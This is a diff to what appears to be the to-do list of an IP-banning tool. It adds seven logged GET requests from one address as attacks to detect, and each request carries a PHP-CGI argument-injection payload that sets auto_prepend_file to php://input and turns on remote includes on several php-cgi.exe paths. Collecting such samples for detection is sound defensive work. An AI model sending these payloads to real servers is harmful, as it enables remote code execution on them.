@@ -2,3 +2,19 @@
 - fork on external blacklist update
 - honeypot mode. Instead of banning with ipchains, ban manually and log all requests from banned ips
 - per host settings
+
+add these attacks:
+37.46.196.22 - - [17/Dec/2025:05:52:09 +0200] "GET /index.php?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%ADd+auto_p
+repend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:11 +0200] "GET /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%
+ADd+auto_prepend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:14 +0200] "GET /php/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%ADd+
+auto_prepend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:16 +0200] "GET /cgi-bin/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%
+ADd+auto_prepend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:18 +0200] "GET /php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%ADd+auto
+_prepend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:21 +0200] "GET /php.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%ADd+auto_pre
+pend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+37.46.196.22 - - [17/Dec/2025:05:52:23 +0200] "GET /php/php.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env%3D0+%ADd+fastcgi.impersonate%3D1+%ADd+open_basedir%3D+%ADd+disable_functions%3D+%ADd+auto
+_prepend_file%3Dphp://input+%ADd+allow_url_include%3D1+%ADd+allow_url_fopen%3D1 HTTP/1.0" 401 683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
